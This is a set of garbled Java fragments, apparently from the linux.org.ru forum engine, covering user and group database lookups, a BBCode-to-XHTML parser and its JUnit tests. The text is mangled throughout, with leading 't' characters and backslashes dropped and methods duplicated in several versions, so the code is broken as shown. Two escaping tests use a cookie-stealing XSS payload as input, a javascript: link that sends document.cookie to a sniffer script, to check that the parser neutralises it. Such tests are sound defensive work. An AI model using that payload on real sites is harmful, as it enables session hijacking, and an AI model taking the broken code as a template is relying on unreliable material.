private static User getUserInternal ( JdbcTemplate jdbcTemplate , String nick ) hrows UserNotFoundException { if ( nick = = null ) { hrow new NullPointerException ( ) ; } if ( ! StringUtil . checkLoginName ( nick ) ) { hrow new UserNotFoundException ( " <invalid name> " ) ; } Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; List < User > list = jdbcTemplate . query ( " SELECT id,nick,candel,canmod,corrector,passwd,blocked,score,max_score,activated,photo,email,name,unread_events FROM users where nick=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , nick ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( nick ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } User user = list . get ( 0 ) ; String cacheId = " User?id= " + user . getId ( ) ; cache . put ( new Element ( cacheId , user ) ) ; return user ; } 
public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } 
public User getUser ( String nick ) hrows UserNotFoundException { return getUserInternal ( jdbcTemplate , nick ) ; } 
public User getUser ( int id , boolean useCache ) hrows UserNotFoundException { return getUserInternal ( jdbcTemplate , id , useCache ) ; } 
public User getUserCached ( int id ) hrows UserNotFoundException { return getUserInternal ( jdbcTemplate , id , rue ) ; } 
public User getUser ( int id ) hrows UserNotFoundException { return getUserInternal ( jdbcTemplate , id , false ) ; } 
public static User getUser ( JdbcTemplate jdbcTemplate , int id , boolean useCache ) hrows UserNotFoundException { return getUserInternal ( jdbcTemplate , id , useCache ) ; } 
private static User getUserInternal ( JdbcTemplate jdbcTemplate , int id , boolean useCache ) hrows UserNotFoundException { Cache cache = CacheManager . create ( ) . getCache ( " Users " ) ; String cacheId = " User?id= " + id ; User res = null ; if ( useCache ) { Element element = cache . get ( cacheId ) ; if ( element ! = null ) { res = ( User ) element . getObjectValue ( ) ; } } if ( res = = null ) { List < User > list = jdbcTemplate . query ( " SELECT id, nick,score, max_score, candel,canmod,corrector,passwd,blocked,activated,photo,email,name,unread_events FROM users where id=? " , new RowMapper < User > ( ) { @Override public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } } , id ) ; if ( list . isEmpty ( ) ) { hrow new UserNotFoundException ( id ) ; } if ( list . size ( ) > 1 ) { hrow new RuntimeException ( " list.size()>1 ??? " ) ; } res = list . get ( 0 ) ; cache . put ( new Element ( cacheId , res ) ) ; } return res ; } 
public User mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new User ( rs ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; 
public void paraTest1 ( ) { Assert . assertEquals ( " <p>some1 text</p><p>some2 text n</p><ul> n<li>one n</li><li>two</li></ul> n<p><a href= \" http:www.example.com \" >http:www.example.com</a> - some3 text</p> " , ParserUtil . bb2xhtml ( " some1 text nsome2 text n[list] n[*]one n[*]two n[/list] n[url]http:www.example.com[/url] - some3 text " , null ) ) ; 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , ParserUtil . bb2xhtml ( " est ntest1 ntest2 " , null ) ) ; } 
public void agEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " , null ) , " <p>&lt;br&gt;</p> " ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , null ) , 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , null ) , 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <p>0</p><ul><li>1</li><li>2</li></ul> " ) ; } 
public void codeEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code] \" code&code \" [/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " , null ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " , null ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " , null ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " , null ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [quote][/quote] " , null ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , null ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list][*]one[*]two[*]three[/list] " , null ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code][list][*]one[*]two[*]three[/list][/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [code][/code] " , null ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=cxx]#include <stdio.h>[/code] " , null ) ) ; } 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=foo]#include <stdio.h>[/code] " , null ) ) ; } 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , ParserUtil . bb2xhtml ( " some text n some again text [url=http:example.com]example[/url] example " , null ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " , null ) ) ; } 
public void paraTest1 ( ) { Assert . assertEquals ( " <p>some1 text</p><p>some2 text n</p><ul> n<li>one n</li><li>two</li></ul> n<p><a href= \" http:www.example.com \" >http:www.example.com</a> - some3 text</p> " , ParserUtil . bb2xhtml ( " some1 text nsome2 text n[list] n[*]one n[*]two n[/list] n[url]http:www.example.com[/url] - some3 text " , null ) ) ; 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]linux[/b][/url] " , null ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " , null ) ) ; 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , null ) ) ; 
public static String bb2xhtml ( String bbcode ) { return parserWithOutImages . parse ( new RootNode ( parserWithOutImages ) , bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setConnection ( db ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public String renderXHtml ( ) { hrow new UnsupportedOperationException ( ) ; } 
public String renderBBCode ( ) { hrow new UnsupportedOperationException ( ) ; } 
public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . oString ( ) ; } 
public String renderXHtml ( ) { return renderChildrenXHtml ( ) ; } 
public String renderXHtml ( ) { return bbtag . renderNodeXhtml ( his ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { if ( db ! = null ) { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } else { pattern = " %s " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , ParserUtil . bb2xhtml ( " est ntest1 ntest2 " ) ) ; } 
public void agEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " ) , " <p>&lt;br&gt;</p> " ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " ) , 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " ) , 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " ) , " <p>0</p><ul><li>1</li><li>2</li></ul> " ) ; } 
public void codeEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code] \" code&code \" [/code] " ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " ) , " <p><br></p> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " ) , " <p><b>hello world</b></p> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " ) , " <p><i>hello world</i></p> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " ) , " <p><s>hello world</s></p> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " ) , " <p><strong>hello world</strong></p> " ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [quote][/quote] " ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " ) , " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " ) , " <p><a href= \" http:linux.org.ru \" >linux</a></p> " ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " ) , " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][b]linux[/b][/url] " ) , " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list][*]one[*]two[*]three[/list] " ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code][list][*]one[*]two[*]three[/list][/code] " ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void codeCleanTest ( ) { Assert . assertEquals ( " " , ParserUtil . bb2xhtml ( " [code][/code] " ) ) ; } 
public void codeKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" language-cpp \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=cxx]#include <stdio.h>[/code] " ) ) ; 
public void codeUnKnowTest ( ) { Assert . assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>#include &lt;stdio.h&gt;</code></pre></div> " , ParserUtil . bb2xhtml ( " [code=foo]#include <stdio.h>[/code] " ) ) ; 
public void spacesTest ( ) { Assert . assertEquals ( " <p>some text</p><p> some again text <a href= \" http:example.com \" >example</a> example</p> " , ParserUtil . bb2xhtml ( " some text n some again text [url=http:example.com]example[/url] example " ) ) ; 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " ) ) ; 
public void paraTest1 ( ) { Assert . assertEquals ( " <p>some1 text</p><p>some2 text n</p><ul> n<li>one n</li><li>two</li></ul> n<p><a href= \" http:www.example.com \" >http:www.example.com</a> - some3 text</p> " , ParserUtil . bb2xhtml ( " some1 text nsome2 text n[list] n[*]one n[*]two n[/list] n[url]http:www.example.com[/url] - some3 text " ) ) ; 
public Message getNextMessage ( Connection db , SectionDao sectionStore ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT min(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db , SectionDao sectionStore ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( sectionid ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT max(topics.id) as msgid FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public void processRow ( ResultSet rs ) hrows SQLException { Section section = new Section ( rs ) ; sections . put ( section . getId ( ) , section ) ; sectionsList . add ( section ) ; } 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url] nhttp:linux.org.ru[/url] " ) ) ; 
public static Group getGroup ( Connection db , int id ) hrows SQLException , BadGroupException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , rue ) ; JdbcTemplate jdbcTemplate = new JdbcTemplate ( scds ) ; return GroupDao . getGroup ( jdbcTemplate , id ) ; } 
public Group getGroup ( Connection db , String name ) hrows SQLException , BadGroupException { PreparedStatement st = db . prepareStatement ( " SELECT id FROM groups WHERE section=? AND urlname=? " ) ; st . setInt ( 1 , id ) ; st . setString ( 2 , name ) ; ResultSet rs = st . executeQuery ( ) ; if ( ! rs . next ( ) ) { hrow new BadGroupException ( " group not found " ) ; } return Group . getGroup ( db , rs . getInt ( 1 ) ) ; } 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , Tags . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
public View oldLink ( @RequestParam int section , @RequestParam ( required = false ) Integer offset , @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " group " , required = false ) Integer groupId ) hrows Exception { if ( offset ! = null ) { return new RedirectView ( Section . getNewsViewerLink ( section ) + " ?offset= " + Integer . oString ( offset ) ) ; } if ( year ! = null & & month ! = null ) { return new RedirectView ( Section . getArchiveLink ( section ) + Integer . oString ( year ) + '/' + Integer . oString ( month ) ) ; } if ( groupId ! = null ) { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; Group group = Group . getGroup ( db , groupId ) ; return new RedirectView ( Section . getNewsViewerLink ( section ) + group . getUrlName ( ) + '/' ) ; } finally { if ( db ! = null ) { db . close ( ) ; } } } return new RedirectView ( Section . getNewsViewerLink ( section ) ) ; } 
public Group getGroup ( int id ) hrows BadGroupException { return getGroupInternal ( jdbcTemplate , id ) ; } 
public static Group getGroup ( JdbcTemplate jdbcTemplate , int id ) hrows BadGroupException { return getGroupInternal ( jdbcTemplate , id ) ; } 
private static Group getGroupInternal ( JdbcTemplate jdbcTemplate , int id ) hrows BadGroupException { ry { return jdbcTemplate . queryForObject ( 
public Group mapRow ( ResultSet resultSet , int i ) hrows SQLException { return new Group ( resultSet ) ; } 
private Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & agName . equals ( " url2 " ) ) ) { currentNode = empNode ; currentNode = ascend ( currentNode ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( new UserDao ( new SingleConnectionDataSource ( db , rue ) ) ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; return parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { if ( userDao ! = null ) { User user = userDao . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } else { pattern = " %s " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; } 
public void splinterTest1 ( ) hrows Exception { http:www.linux.org.ru/forum/linux-org-ru/6448266 UserDao userDao = mock(UserDao.class); User user = mock(User.class); when(user.isBlocked()).thenReturn(false); when(userDao.getUser("splinter")).thenReturn(user); Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) hrows SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = Group . getGroup ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , preparedMessage . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; if ( group . isModerated ( ) ) { params . put ( " opTags " , Tags . getTopTags ( db ) ) ; } return new ModelAndView ( " edit " , params ) ; } 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) hrows SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { pm . add ( new PreparedMessage ( db , message , false ) ) ; } return pm ; } 
public void initTest ( ) hrows Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . henReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . henReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; 
public void userTest ( ) { Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/maxcom/profile'>maxcom</a></span></p> " , ParserUtil . bb2xhtml ( " [user]maxcom[/user] " , rue , rue , " " , userDao ) ) ; Assert . assertEquals ( " <p><span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/isden/profile'>isden</a></s></span></p> " , ParserUtil . bb2xhtml ( " [user]isden[/user] " , rue , rue , " " , userDao ) ) ; Assert . assertEquals ( " <p><s>hizel</s></p> " , ParserUtil . bb2xhtml ( " [user]hizel[/user] " , rue , rue , " " , userDao ) ) ; 
public void initTest ( ) hrows Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . henReturn ( false ) ; when ( userDao . getUser ( " splinter " ) ) . henReturn ( user ) ; } 
public void splinterTest1 ( ) hrows Exception { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public boolean isPreviewMode ( ) { return preview ! = null ; } 
private static void createReplyTo ( Message opic , Integer replyTo , Map < String , Object > params , Connection db ) hrows SQLException , MessageNotFoundException , AccessViolationException , UserNotFoundException { if ( replyTo ! = null & & replyTo > 0 ) { Comment onComment = new Comment ( db , replyTo ) ; 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } ry { setValue ( userDao . getUser ( s ) ) ; 
public ModelAndView showForm ( @ModelAttribute ( " add " ) AddCommentRequest add , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showForm ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors , ServletRequest request ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showFormReply ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors , ServletRequest request ) hrows Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors ) hrows Exception { Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) AddCommentRequest add , Errors errors , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public List < Integer > deleteReplys ( int msgid , User user , boolean score ) { return deleteReplys ( msgid , user , score , 0 ) ; } 
public Integer mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return rs . getInt ( 1 ) ; } 
public void changeScore ( User user , int delta ) { jdbcTemplate . update ( " UPDATE users SET score=score+? WHERE id=? " , delta , user . getId ( ) ) ; } 
